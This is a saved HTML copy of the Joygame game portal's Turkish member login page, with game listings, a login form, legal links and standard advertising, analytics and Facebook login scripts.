</a>

</li>

<li>

<a href="//www.joygame.com/flash-oyunlar/balonlari-patlat">

Balonları Patlat

</a>

</li>

<li>

<a href="//www.joygame.com/flash-oyunlar/en-buyuk-sanatci">

En Büyük Sanatçı

</a>

</li>

<li>

<a href="//www.joygame.com/flash-oyunlar/donut-sevgisi">

Donut Sevgisi

</a>

</li>

<li>

<a href="//www.joygame.com/flash-oyunlar/pet-crush-saga">

Pet Crush Saga

</a>

</li>

</ul>
                    </div>
                    <div class="tb-col-10 tb-col-omega">
                        <div class="tb-row">
                            
                            <div class="tb-game-box tb-col-2">
                                <div class="tb-game-cover">
                                    <a href="//joy.ac/4fKm">
                                        <img src="//cdn.joy.ac/i/122073426/6k1b.png" alt="ABC Gizemleri">
                                    </a>
                                </div>
                                <div class="tb-game-info">
                                    <a class="tb-game-name" href="//joy.ac/4fKm">
                                        ABC Gizemleri
                                    </a>
                                    <!--<div class="tb-text-muted">
                                        MMOFPS
                                    </div>-->
                                </div>
                                <!--<a href="#" class="tb-game-btn">
                                    Hemen Oyna
                                </a>-->
                            </div>
                            
                            <div class="tb-game-box tb-col-2">
                                <div class="tb-game-cover">
                                    <a href="//joy.ac/4fKn">
                                        <img src="//cdn.joy.ac/i/122073426/6k1p.jpg" alt="Futbol Taktikleri">
                                    </a>
                                </div>
                                <div class="tb-game-info">
                                    <a class="tb-game-name" href="//joy.ac/4fKn">
                                        Futbol Taktikleri
                                    </a>
                                    <!--<div class="tb-text-muted">
                                        MMOFPS
                                    </div>-->
                                </div>
                                <!--<a href="#" class="tb-game-btn">
                                    Hemen Oyna
                                </a>-->
                            </div>
                            
                            <div class="tb-game-box tb-col-2">
                                <div class="tb-game-cover">
                                    <a href="//joy.ac/4fKo">
                                        <img src="//cdn.joy.ac/i/122073426/6k1j.png" alt="Şeker Yağmuru">
                                    </a>
                                </div>
                                <div class="tb-game-info">
                                    <a class="tb-game-name" href="//joy.ac/4fKo">
                                        Şeker Yağmuru
                                    </a>
                                    <!--<div class="tb-text-muted">
                                        MMOFPS
                                    </div>-->
                                </div>
                                <!--<a href="#" class="tb-game-btn">
                                    Hemen Oyna
                                </a>-->
                            </div>
                            
                            <div class="tb-game-box tb-col-2">
                                <div class="tb-game-cover">
                                    <a href="//joy.ac/4fKp">
                                        <img src="//cdn.joy.ac/i/122073426/6k21.png" alt="Korsan Koyu">
                                    </a>
                                </div>
                                <div class="tb-game-info">
                                    <a class="tb-game-name" href="//joy.ac/4fKp">
                                        Korsan Koyu
                                    </a>
                                    <!--<div class="tb-text-muted">
                                        MMOFPS
                                    </div>-->
                                </div>
                                <!--<a href="#" class="tb-game-btn">
                                    Hemen Oyna
                                </a>-->
                            </div>
                            
                            <div class="tb-game-box tb-col-2">
                                <div class="tb-game-cover">
                                    <a href="//joy.ac/4fKq">
                                        <img src="//cdn.joy.ac/i/122073426/6k1u.png" alt="Mahjong 2">
                                    </a>
                                </div>
                                <div class="tb-game-info">
                                    <a class="tb-game-name" href="//joy.ac/4fKq">
                                        Mahjong 2
                                    </a>
                                    <!--<div class="tb-text-muted">
                                        MMOFPS
                                    </div>-->
                                </div>
                                <!--<a href="#" class="tb-game-btn">
                                    Hemen Oyna
                                </a>-->
                            </div>
                            
                        </div>
                    </div>
                </div>

            </div>
        </div>
        
        
    </div>
</div>



</div>
</div>
    </div>

    
    <div id="wrap" class="bannerTest">

        


        <div class="container no-sidebar">

            <div class="row">
                <div class="col-15 col-omega" id="content">
                    


<div class="page-header profile-edit">
    <h1>Joygame Üyelik</h1>
</div>
<input id="ReturnUrl" name="ReturnUrl" type="hidden" value="https://bill.joygame.com/index.aspx">







    

<div class="row">
    <div class="col-8">

        <div class="" style="padding: 20px; background-color:#fafafa;">
            <form method="post" action="" class="form-horizontal">
                <fieldset>
                    <legend>Üye Girişi </legend>
                    <div class="form-group">
                        <label for="LoginUserName" class="col-2 control-label">Kullanıcı Adı</label>
                        <div class="col-5 col-omega">
                            <input class="form-control" name="login" type="text" value="">
                            <span class="field-validation-valid field-error" data-valmsg-for="UserName" data-valmsg-replace="true"></span>
                        </div>
                    </div>
                    <div class="form-group">
                        <label for="LoginPassword" class="col-2 control-label">Şifreniz</label>
                        <div class="col-5 col-omega">
                            <input class="form-control" name="password" type="password">
                            <span class="field-validation-valid field-error" data-valmsg-for="Password" data-valmsg-replace="true"></span>
                        </div>
                    </div>
                </fieldset>
                <div class="form-group">
                    <div class="col-7 col-omega">
                        <div class="text-right">
                            <button class="btn btn-success btn-update">
                                Üye Girişi
                            </button>
                        </div>
                    </div>
                </div>
            </form>
            <div class="form-group">
                <div class="col-7 col-omega">
                    <div class="text-right">
                        <a href="/sifremi-unuttum">Şifremi unuttum</a>
                    </div>
                </div>
            </div>
            <br>
            <br>
            <br>
            <br>
            <div class="row">
                <div class="col-7">
                    <a href="#" class="btn tb-btn-fb fb-login pull-right">
                        <i class="jg-ico fb-16x16-white"></i>
                        Facebook İle Giriş Yap
                    </a>
                </div>
            </div>
        </div>

    </div>
    <div class="col-7 col-omega">

        <div style="padding: 80px 20px;" class="text-center be-a-member">
            <h4>
                Üye değil misin?
            </h4>
            <p>
                Eğlenceye katılmak için durma, sen de üye ol!
            </p>
            <p>
                <br>
                <a href="#!kayit" class="btn btn-lg btn-orange tb-hashlink">
                    Hemen Üye Ol
                </a>
            </p>

        </div>

    </div>
</div>






                </div>
                <div class="hidden" id="sidebar">
                    

                </div>
            </div>

        </div> <!-- /container -->

    </div><!-- /#wrap -->
<div id="footer-wrapper">
    <div id="footer-menu">
        <div class="container">
            <div class="row">

                <div class="col-12">
                    <div class="row" id="mainweb-footer-games-lists">

                        <div class="col-3">

                            <a href="/oyunlar" class="fm-header">
                                PC Oyunları
                            </a>

                            <ul id="footer-games-pc" class="list-unstyled">
                                        <li>
                                            <a href="//joy.ac/4gCw">
                                                Wolfteam
                                            </a>
                                        </li>
                                        <li>
                                            <a href="https://www.houndsonline.com/tr/?utm_source=Joygame&amp;utm_medium=tbm&amp;utm_campaign=houndsjoygamedropdown">
                                                Hounds: The Last Hope
                                            </a>
                                        </li>
                                        <li>
                                            <a href="https://joy.ac/4j1i">
                                                MStar
                                            </a>
                                        </li>
                            </ul>

                        </div>
                        <div class="col-3">
                            <a href="/mobil-oyunlar" class="fm-header">
                                Mobil Oyunlar
                            </a>
                         

                            <ul id="footer-games-mobile" class="list-unstyled">
                                        <li>
                                            <a href="//play.google.com/store/apps/details?id=com.netmarbletr.momatr">
                                                Paramanya
                                            </a>
                                        </li>
                                        <li>
                                            <a href="//joy.ac/bluestacksgameicons">
                                                Lineage 2: Revolution
                                            </a>
                                        </li>
                                        <li>
                                            <a href="http://smarturl.it/1ffejg">
                                                Iron Throne
                                            </a>
                                        </li>
                                        <li>
                                            <a href="//www.joygame.com/marvel-future-fight">
                                                MARVEL Future Fight
                                            </a>
                                        </li>
                                        <li>
                                            <a href="//joy.ac/4gbG">
                                                Seven Knights
                                            </a>
                                        </li>
                                        <li>
                                            <a href="//buff.ac/4cWM ">
                                                Star Wars™: Force Arena
                                            </a>
                                        </li>
                                        <li>
                                            <a href="//buff.ac/4dkd">
                                                Savaş Meydanı
                                            </a>
                                        </li>
                                        <li>
                                            <a href="http://smarturl.it/k5fiza">
                                                Fishing Strike
                                            </a>
                                        </li>
                                        <li>
                                            <a href="//smarturl.it/jmz8p6">
                                                Destiny Knights
                                            </a>
                                        </li>
                                        <li>
                                            <a href="//smarturl.it/1t8emo">
                                                Phantomgate : The Last Valkyrie
                                            </a>
                                        </li>
                            </ul>

                        </div>
                        <div class="col-6 col-omega">
                            <a href="/web-tabanli-oyunlar" class="fm-header">
                                Web Oyunları
                            </a>
                            
                            
                         

                            <ul id="footer-games-browser" class="list-unstyled">
                                        <li>
                                            <a href="//www.joygame.com/drakensang/">
                                                Drakensang
                                            </a>
                                        </li>
                                        <li>
                                            <a href="//www.joygame.com/farmerama/">
                                                Farmerama
                                            </a>
                                        </li>
                                        <li>
                                            <a href="//www.joygame.com/skyrama/">
                                                Skyrama
                                            </a>
                                        </li>
                                        <li>
                                            <a href="//www.joygame.com/darkorbit/">
                                                Darkorbit
                                            </a>
                                        </li>
                                        <li>
                                            <a href="//www.joygame.com/piratestorm/">
                                                Pirate Storm
                                            </a>
                                        </li>
                                        <li>
                                            <a href="//www.joygame.com/seafight/">
                                                Seafight
                                            </a>
                                        </li>
                                        <li>
                                            <a href="//www.joygame.com/deepolis/">
                                                Deepolis
                                            </a>
                                        </li>
                                        <li>
                                            <a href="//www.joygame.com/desert-operations/">
                                                Desert Operations
                                            </a>
                                        </li>
                                        <li>
                                            <a href="//joy.ac/Rising_Cities_Oyna">
                                                Rising Cities
                                            </a>
                                        </li>
                                        <li>
                                            <a href="//joy.ac/LPTopBarTitle">
                                                Lady Popular
                                            </a>
                                        </li>
                            </ul>

                        </div>

                    </div>
                </div>

                <div class="col-3 col-omega">
                    <div class="social-media">
                        <span class="fm-header">BİZİ TAKİP EDİN</span>
                        <div class="social-media-icons">
                                    <a href="//www.facebook.com/joygameshr" class="jg-ico fb-32x32-grey" title="Facebook" target="_blank"></a>
                                    <a href="//twitter.com/SHRJoygame" class="jg-ico tw-32x32-grey" title="Twitter" target="_blank"></a>
                                    <a href="//www.youtube.com/user/SHRJoyGame" class="jg-ico yb-32x32-grey" title="Youtube" target="_blank"></a>

                            <a href="http://cdn.joy.ac/i/647908713/6njd.jpg" class="line-32x32-gray fancybox" title="Line"></a>
                        </div>
                    </div>

                    <div class="e-newsletter">
                        <span class="fm-header">E-BÜLTEN</span>
                        <p>
                            Joygame'den haberdar olmak için
                            <a class="as-modal" href="/Modals/bulletin">tıklayın</a>
                        </p>
                    </div>

                    <div class="joypara">
                        <a href="https://bill.joygame.com" class="fm-header">JOYPARA</a>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div id="footer-partners">
        <div class="container">

        </div>
    </div>

    <div id="footer">
        <div class="container">
            <div class="row">
                <div class="col-12">
                    <ul class="list-unstyled clearfix" id="footer-links">
                                <li>
                                        <a href="//kurumsal.joygame.com/" target="_blank">Hakkımızda</a>
                                </li>
                                <li>
                                        <a href="//www.joygame.com/kullanici-sozlesmesi" target="_blank">Kullanıcı Sözleşmesi</a>
                                </li>
                                <li>
                                        <a href="/kisisel-verilerin-korunmasi" target="_blank">Kişisel Verilerin Korunması</a>
                                </li>
                                <li>
                                        <a href="/cerez-politikasi" target="_blank">Çerez Politikası</a>
                                </li>
                                <li>
                                        <a href="//www.joygame.com/gizlilik-ilkeleri" target="_blank">Gizlilik İlkelerimiz</a>
                                </li>
                                <li>
                                        <a href="//www.joygame.com/tuketici-bilgilendirme-notu" target="_blank">Tüketici Bilgilendirme Notu</a>
                                </li>
                                <li>
                                        <a href="//www.joygame.com/mesafeli-satis-sozlesmesi" target="_blank">Mesafeli Satış Sözleşmesi</a>
                                </li>
                                <li>
                                        <a href="//www.joygame.com/bilgilendirme-formu" target="_blank">Bilgilendirme Formu</a>
                                </li>
                                <li>
                                        <a href="//kurumsal.joygame.com/Contact/contactUs" target="_blank">İletişim</a>
                                </li>

                    </ul>
                </div>
                <div class="col-3 col-omega">
                    <p class="text-right">
                        © Joygame 2019
                    </p>
                </div>
            </div>
        </div>
    </div>
</div>





<script src="/Scripts/jquery?v=7phsqZsvE2EhU22PNE3iYnRsSQPqEzMpnxlK1wBTHEI1"></script><script type="text/javascript" id="">var googletag=googletag||{};googletag.cmd=googletag.cmd||[];(function(){var a=document.createElement("script");a.async=!0;a.type="text/javascript";var b="https:"==document.location.protocol;a.src=(b?"https:":"http:")+"//www.googletagservices.com/tag/js/gpt.js";b=document.getElementsByTagName("script")[0];b.parentNode.insertBefore(a,b)})();</script>
<script type="text/javascript" id="">!function(b,e,f,g,a,c,d){b.fbq||(a=b.fbq=function(){a.callMethod?a.callMethod.apply(a,arguments):a.queue.push(arguments)},b._fbq||(b._fbq=a),a.push=a,a.loaded=!0,a.version="2.0",a.queue=[],c=e.createElement(f),c.async=!0,c.src=g,d=e.getElementsByTagName(f)[0],d.parentNode.insertBefore(c,d))}(window,document,"script","https://connect.facebook.net/en_US/fbevents.js");fbq("init","916131311736751");fbq("set","agent","tmgoogletagmanager","916131311736751");fbq("track","PageView");</script>
<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=916131311736751&amp;ev=PageView&amp;noscript=1"></noscript>

<script type="text/javascript" id="">!function(b,e,f,g,a,c,d){b.fbq||(a=b.fbq=function(){a.callMethod?a.callMethod.apply(a,arguments):a.queue.push(arguments)},b._fbq||(b._fbq=a),a.push=a,a.loaded=!0,a.version="2.0",a.queue=[],c=e.createElement(f),c.async=!0,c.src=g,d=e.getElementsByTagName(f)[0],d.parentNode.insertBefore(c,d))}(window,document,"script","https://connect.facebook.net/en_US/fbevents.js");fbq("init","1777788502318635");fbq("set","agent","tmgoogletagmanager","1777788502318635");fbq("track","PageView");</script>
<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1777788502318635&amp;ev=PageView&amp;noscript=1"></noscript>
<script type="text/javascript" id="" src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>

    <script type="text/javascript" src="https://services.joygame.com/Scripts/topbar5?v=ac46447f493566263266f6955958bc2d"></script>

    <script type="text/javascript">
        $(document).ready(function () {
            JG.IsAuthenticated = false;
        });
        var siteLanguage  ='tr';
        var facebookLang  =siteLanguage + '_' + siteLanguage.toUpperCase();
    </script>

    <script src="/Scripts/jgall?v=Jnr60CZsOCDs9KLsupApcASfdOo0DqFDBgAGZ85vNAA1"></script>

    <script src="/Scripts/joygame-core?v=L_X01frQu_eC90TFNQFXlbdsesT-WrH16jhsE9_kyRY1"></script>
<script type="text/javascript" id="">(adsbygoogle=window.adsbygoogle||[]).push({google_ad_client:"ca-pub-2250110434319819",enable_page_level_ads:!0});</script><ins class="adsbygoogle adsbygoogle-noablate" data-adsbygoogle-status="done" style="display: none !important;"><ins id="aswift_0_expand" style="display:inline-table;border:none;height:0px;margin:0;padding:0;position:relative;visibility:visible;width:0px;background-color:transparent;"><ins id="aswift_0_anchor" style="display:block;border:none;height:0px;margin:0;padding:0;position:relative;visibility:visible;width:0px;background-color:transparent;"><iframe frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" allowfullscreen="true" onload="var i=this.id,s=window.google_iframe_oncopy,H=s&amp;&amp;s.handlers,h=H&amp;&amp;H[i],w=this.contentWindow,d;try{d=w.document}catch(e){}if(h&amp;&amp;d&amp;&amp;(!d.body||!d.body.firstChild)){if(h.call){setTimeout(h,0)}else if(h.match){try{h=s.upd(h,i)}catch(e){}w.location.replace(h)}}" id="aswift_0" name="aswift_0" style="left:0;position:absolute;top:0;border:0px;width:0px;height:0px;"></iframe></ins></ins></ins>



    
    <script type="text/javascript">

        var registerFormSelector = "#register-form",
            loginFormSelector = "#login-form";

        function jg_ProccessLoginResult(result) {
            var $form = $(loginFormSelector);
            var $submit = $form.find(":submit"),
                valide = $form.validate();

            if (!result.IsSucceeded) {
                $form.data("submitted", "false");
                $submit.prop("disabled", false);
                $submit.text("Üye Girişi");

                valide.showErrors({
                    "UserName": "Kullanıcı adın ya da şifren hatalı, kontrol edip tekrar deneyebilirsin!"
                });
                return;
            }

            window.CurrentUser = result.Data;
            JG.CurrentUser = window.CurrentUser;
            $(document).trigger(JG.CustomEvent.AfterLoginSuccess);
        };


        function jg_ProccessRegisterResult(result) {
            var $form = $(registerFormSelector);
            var $submit = $form.find(":submit"),
                valide = $form.validate();


            if (!result.IsSucceeded) {
                $form.data("submitted", "false");
                $submit.prop("disabled", false);
                $submit.text("Hemen Üye Ol");

                var errors = {};

                $.each(result.ErrorMessages, function (i, item) {
                    var propName = item.PropertyName.replace("TopbarRegister", "Register");
                    errors[propName] = JG.Translate(item.ErrorCode);
                });

                if (typeof valide.errorMap === "object") {
                    $.extend(errors, valide.errorMap);
                }
                valide.showErrors(errors);
                return;
            }

            window.CurrentUser = result.Data;
            JG.CurrentUser = window.CurrentUser;
            $(document).trigger(JG.CustomEvent.AfterRegisterCompleted);
        };


        $(document).ready(function () {

            var loginSubmitHandler = function (form) {
                var $form = $(form),
                    $submit = $form.find(":submit"),
                    valide = $form.validate();

                if ($form.data("submitted") === "true") {
                    return;
                }

                $form.data("submitted", "true");
                $submit.text('Lütfen bekleyin...');
                $submit.prop("disabled", false);

                JG.SendLoginRequest({
                    "username": $("#LoginUserName").val(),
                    "password": $("#LoginPassword").val(),
                    "remember": false,
                    "callback": "jg_ProccessLoginResult"
                });
            };

            var registerSubmitHandler = function (form) {
                var $form = $(form),
                    $submit = $form.find(":submit"),
                    valide = $form.validate();

                if ($form.data("submitted") === "true") {
                    return;
                }

                $form.data("submitted", "true");
                $submit.text('Lütfen bekleyin...');
                $submit.prop("disabled", false);

                JG.SendRegisterRequest({
                    "username": $("#RegisterUserName").val(),
                    "password": $("#RegisterPassword").val(),
                    "email": $("#RegisterEmail").val(),
                    "captcha": $("#RegisterCaptcha").val(),
                    "acceptRules": $("#RegisterAcceptRules").prop("checked"),
                    "callback": "jg_ProccessRegisterResult"
                });
                return false;
            };

            var registerValidationSettings = {
                "submitHandler": registerSubmitHandler,
                "messages": {
                    "Password": {
                        "required": 'Lütfen şifreni gir!',
                        "min6max16nospecialchar": 'Şifren en az 6 en çok 16 karakter uzunlukta olmalı, Türkçe ve özel karakterler içermemelidir!'
                    },
                    "UserName": {
                        "required": 'Lütfen kullanıcı adını gir!',
                        "isUserNameExists": 'Bu kullanıcı adı başka bir kullanıcı tarafından kullanılıyor, lütfen başka bir kullanıcı adı seç!',
                        "min6max16nospecialchar": 'Kullanıcı adı en az 6 en çok 16 karakter uzunlukta olmalı, Türkçe ve özel karakterler içermemelidir!'
                    },
                    "Email": {
                        "required": 'Lütfen e-posta adresini gir!',
                        "isEmail": 'Lütfen geçerli bir e-posta adresi gir!',
                        "isEmailExists": 'Bu e-posta adresi başka bir kullanıcı tarafından kullanılıyor, lütfen farklı bir e-posta adresi seç!'
                    },
                    "RegisterCaptcha": {
                        "required": 'Lütfen resimdeki güvenlik kodunu gir!',
                        "remote": 'Güvenlik kodu geçerli değil!'
                    },
                    "RegisterAcceptRules": {
                        "required": 'Üye olabilmek için Kayıt ve Site Kullanım şartlarını kabul etmelisin!'
                    }
                },
                "rules": {
                    "Password": {
                        "required": true,
                        "min6max16nospecialchar": true
                    },
                    "UserName": {
                        "required": true,
                        "isUserNameExists": true,
                        "min6max16nospecialchar": true
                    },
                    "Email": {
                        "required": true,
                        "isEmail": true,
                        "isEmailExists": true
                    },
                    "RegisterCaptcha": {
                        "required": true
                        //,"remote": {
                        //    "url": JG.settings.CaptchaCheckUrl,
                        //    "dataType": "jsonp",
                        //    "jsonpCallback": "JG.ProccessIsCaptchaValidResult",
                        //    "type": "get",
                        //    "crossDomain": true,
                        //    "xhrFields": {
                        //        "withCredentials": true
                        //    },
                        //    "data": {
                        //        "captcha": function () {
                        //            return $("#RegisterCaptcha").val();
                        //        },
                        //        "formId": "register-form",
                        //        "propName": "RegisterCaptcha"
                        //    }
                        //}
                    },
                    "RegisterAcceptRules": {
                        "required": true
                    }
                }
            };

            Utils.SetValidation(registerFormSelector, registerValidationSettings);

            var loginValidationSettings = {
                "submitHandler": loginSubmitHandler,
                "messages": {
                    "Password": {
                        "required": 'Lütfen şifreni gir!'
                    },
                    "UserName": {
                        "required": 'Lütfen kullanıcı adını gir!'
                    },
                },
                "rules": {
                    "Password": {
                        "required": true
                    },
                    "UserName": {
                        "required": true
                    }
                }
            };

            Utils.SetValidation(loginFormSelector, loginValidationSettings);


        });
    </script>




<div id="fb-root" class=" fb_reset"><script async="" src="https://connect.facebook.net/tr_TR/all.js"></script><div style="position: absolute; top: -10000px; width: 0px; height: 0px;"><div><iframe name="fb_xdm_frame_https" frameborder="0" allowtransparency="true" allowfullscreen="true" scrolling="no" allow="encrypted-media" id="fb_xdm_frame_https" aria-hidden="true" title="Facebook Cross Domain Communication Frame" tabindex="-1" src="https://staticxx.facebook.com/connect/xd_arbiter/r/d_vbiawPdxB.js?version=44#channel=f119afbeadec7a4&amp;origin=https%3A%2F%2Fwww.joygame.com" style="border: none;"></iframe></div><div></div></div></div>

<script type="text/javascript">
    window.fbAsyncInit = function () {
        FB.init({
            appId: '216435178390193',
            cookie: true,
            channelUrl : '/fbchannel.ashx',
            status: true,
            xfbml: true,
            oauth: true,
            version: 'v3.2'
        });

        $(function () {
            // make the button is only enabled after the facebook js sdk has been loaded.
            $('body').on("click", ".fb-login", JG.FacebookLogin);
        });
    };

    (function () {
        var e = document.createElement('script'); e.async = true;
        e.src = document.location.protocol + '//connect.facebook.net/'+facebookLang+'/all.js';
        document.getElementById('fb-root').appendChild(e);
    }());

</script>

<script>
(function (d, s, id) {
    var js, fjs = d.getElementsByTagName(s)[0];
    if (d.getElementById(id)) return;
    js = d.createElement(s); js.id = id;
    js.src = "//connect.facebook.net/'+facebookLang+'/sdk.js#xfbml=1&version=v3.2&appId=216435178390193";
    fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>

    


        <link href="https://fonts.googleapis.com/css?family=Righteous&amp;subset=latin-ext" rel="stylesheet">
    
    


<div><div class="sweet-overlay" tabindex="-1"></div><div class="sweet-alert" tabindex="-1"><div class="icon error"><span class="x-mark"><span class="line left"></span><span class="line right"></span></span></div><div class="icon warning"> <span class="body"></span> <span class="dot"></span> </div> <div class="icon info"></div> <div class="icon success"> <span class="line tip"></span> <span class="line long"></span> <div class="placeholder"></div> <div class="fix"></div> </div> <div class="icon custom"></div> <h2>Title</h2><p>Text</p><button class="cancel" tabindex="2">Cancel</button><button class="confirm" tabindex="1">OK</button></div></div><iframe id="google_osd_static_frame_9344128696125" name="google_osd_static_frame" style="display: none; width: 0px; height: 0px;"></iframe><a class="tb-free-jc" href="https://bservices.joygame.com/Modals/BedavaJoypara">FreeJoycash</a><div class="cookie-info">
    <img id="cookie-close" src="https://cdn.joy.ac/i/18/close.png">
    <div class="text">
        <span>Joygame sitesini kullanarak, çerezlere (cookie) izin vermektesiniz. Detaylı bilgi için </span><a class="link" href="//joygame.com/cerez-politikasi" target="_blank" rel="nofollow"> Çerez Politikamızı</a><br><span> inceleyebilirsiniz.</span>
    </div>
</div></body><iframe id="google_shimpl" style="display: none;"></iframe><iframe id="google_esf" name="google_esf" src="https://googleads.g.doubleclick.net/pagead/html/r20190508/r20190131/zrt_lookup.html#" data-ad-client="ca-pub-2250110434319819" style="display: none;"></iframe></html>